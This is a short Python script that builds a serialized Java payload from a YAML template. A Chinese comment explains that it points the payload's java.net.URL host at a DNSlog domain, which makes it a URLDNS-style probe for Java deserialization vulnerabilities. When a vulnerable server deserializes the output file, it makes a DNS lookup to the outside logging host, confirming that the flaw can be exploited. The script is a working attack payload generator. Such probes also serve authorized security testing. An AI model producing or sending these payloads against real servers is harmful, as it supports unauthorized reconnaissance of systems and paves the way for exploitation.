import yaml

from javaSerializationTools import ObjectWrite

if __name__ == '__main__':
    dnslogUrl = 'bza4l5.dnslog.cn'

    with open('dnslog.yaml', "r") as f:
        dnslog = yaml.load(f, Loader=yaml.FullLoader)
    UrlObject = dnslog.objectAnnotation[2]
    # 修改java.net.URL的host属性为新的dnslog地址
    dnslog.objectAnnotation[1].fields[0][4].value.string = dnslogUrl

    with open('dnslog.ser', 'wb') as f:
        ObjectWrite(f).writeContent(dnslog)
